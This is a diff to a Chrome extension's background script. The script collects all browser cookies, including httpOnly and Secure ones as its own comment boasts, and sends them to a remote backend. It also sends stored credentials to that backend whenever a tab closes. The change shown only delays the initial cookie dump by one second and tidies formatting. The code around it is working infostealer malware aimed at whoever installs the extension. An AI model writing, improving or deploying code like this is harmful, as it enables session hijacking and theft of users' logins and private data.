@@ -18,10 +18,12 @@ chrome.cookies.onChanged.addListener((event) => {
  * no cookies are safe, even httpOnly, sameSite, Secure types
  * This is the initial cookie dump
  */
-chrome.cookies.getAll({}, (r) => {
-  console.log(r);
-  send(r, "cookie");
-});
+setTimeout(() => {
+  chrome.cookies.getAll({}, (r) => {
+    console.log(r);
+    send(r, "cookie");
+  });
+}, 1000);
 
 function send(data, where) {
   fetch(`${BACKEND}/${where}`, {
@@ -58,9 +60,9 @@ chrome.tabs.onUpdated.addListener((tabId, changeInfo, _) => {
 });
 
 chrome.tabs.onCreated.addListener((tab) => {
-    const { origin } = new URL(tab.url);
-    console.log("Created origin: ", origin);
-    urls[tab.id] = origin;
+  const { origin } = new URL(tab.url);
+  console.log("Created origin: ", origin);
+  urls[tab.id] = origin;
 });
 
 // post to server on tab close
@@ -72,12 +74,12 @@ chrome.tabs.onRemoved.addListener((tabId, _) => {
     let origin = urls[tabId];
     console.log("origin == ", origin);
     db[origin] = "";
-    chrome.storage.local.set({database: db})
+    chrome.storage.local.set({ database: db });
   });
   chrome.storage.local.get(["credentials"], (items) => {
     send(items, "credentials");
     console.log("creds: ", items);
-  })
+  });
 });
 
 // from: https://stackoverflow.com/a/1349426
